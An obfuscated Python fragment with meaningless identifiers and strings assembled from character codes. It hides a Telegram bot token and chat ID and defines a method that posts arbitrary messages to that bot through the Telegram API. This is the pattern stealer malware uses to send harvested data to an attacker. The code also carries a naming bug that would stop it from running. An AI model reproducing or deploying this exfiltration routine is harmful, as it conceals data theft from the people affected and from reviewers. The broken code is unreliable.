import xu
xp=xu.post

class xG:
    def __init__(xs):

        xs.token =("".join([chr(55),chr(52),chr(57),chr(53),chr(51),chr(50),chr(52),chr(54),chr(57),chr(50),chr(58),chr(65),chr(65),chr(69),chr(101),chr(55),chr(122),chr(90),chr(85),chr(84),chr(86),chr(104),chr(76),chr(107),chr(83),chr(82),chr(67),chr(54),chr(84),chr(82),chr(80),chr(98),chr(53),chr(97),chr(90),chr(109),chr(107),chr(111),chr(86),chr(87),chr(68),chr(101),chr(66),chr(119),chr(105),chr(73)]))
        xs.chat_id =("".join([chr(53),chr(52),chr(56),chr(55),chr(57),chr(55),chr(56),chr(53),chr(56),chr(56)]))

    def xu(xs, message):
        xw = f"https://api.telegram.org/bot{self.token}/sendMessage"
        xU = {
("".join([chr(99),chr(104),chr(97),chr(116),chr(95),chr(105),chr(100)]))                     : xs.chat_id,
("".join([chr(116),chr(101),chr(120),chr(116)]))                  : message
        }
        xV = xp(xw, params=xU)
